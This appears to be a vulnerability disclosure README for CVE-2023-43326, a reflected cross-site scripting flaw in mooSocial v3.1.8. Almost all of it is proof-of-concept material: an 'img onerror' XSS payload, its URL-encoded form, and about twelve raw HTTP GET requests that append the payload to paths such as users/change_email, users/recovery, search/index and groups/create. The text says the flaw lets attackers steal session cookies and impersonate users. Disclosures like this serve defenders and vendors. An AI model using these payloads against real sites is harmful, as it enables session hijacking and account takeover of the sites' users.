# mooSocial: XSS (CVE-2023-43326)
A reflected cross-site scripting (XSS) vulnerability exisits in multiple url of mooSocial v3.1.8 which allows attackers to steal user's session cookies and impersonate their account via a crafted URL.

**Note: XXS Also works when these URLs are used in Referer Header. There are few examples below, there might me more URL such like below which are also vulerable.** 

## Exploit - Proof of Concept (POC)

### Reflect cross-site scripting (XSS)
```
Payload : ahrixia"><img src=a onerror=alert(1)>ahrixia 
Payload (Url encoded): ahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia
```
![image](https://github.com/ahrixia/mooSocial-XSS2/assets/35935843/97684d10-e189-48c6-9dea-6f0afe4ec211)

GET Request on /moosocial/users/change_email : 
```
GET /moosocial/users/change_emailahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia?step1=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/moosocial/users/change_email
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Connection: close
```


GET Request on /moosocial/users/recovery  : 
```
GET /moosocial/users/recoveryahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia?data%5Bemail%5D=566782 HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Origin: http://localhost
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/users/recover
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

GET Request on /moosocial/users/profile : 
```
GET /moosocial/users/profileahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/moosocial/-aazllyyo5wvv
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Connection: close
```

GET Request on /moosocial/users/do_logout : 
```
GET /moosocial/users/do_logoutahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```

GET Request on /moosocial/topics/create  : 
```
GET /moosocial/topics/createahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/topics
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

GET Request on /moosocial/search/index : 
```
GET /moosocial/search/indexahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia/?q=as HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/moosocial/user_info/index/messages
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close
```

GET Request on /moosocial/groups/create : 
```
GET /moosocial/groups/createahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/groups
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

GET Request on /moosocial/events/create : 
```
GET /moosocial/events/createahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/events
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

GET Request on /moosocial/cron/task/run : 
```
GET /moosocial/cron/task/runbahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia?key=3FSE@ HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
Content-Length: 0
```

GET Request on /moosocial/blogs/create : 
```
GET /moosocial/blogs/createahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/blogs
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```

GET Request on /moosocial/activities/post-feed : 
```
GET /moosocial/activities/post-feedahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cache-Control: max-age=0
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Upgrade-Insecure-Requests: 1
Referer: http://localhost/moosocial/
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```


GET Request on /moosocial/activities/ajax_share : 
```
GET /moosocial/activities/ajax_shareahrixia%22%3e%3cimg%20src%3da%20onerror%3dalert(1)%3eahrixia HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
Connection: close
Cookie: CAKEPHP=dfkstl2jc39i6prjb9m9rvb275
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Sec-CH-UA: ".Not/A)Brand";v="99", "Google Chrome";v="117", "Chromium";v="117"
Sec-CH-UA-Platform: Windows
Sec-CH-UA-Mobile: ?0
```
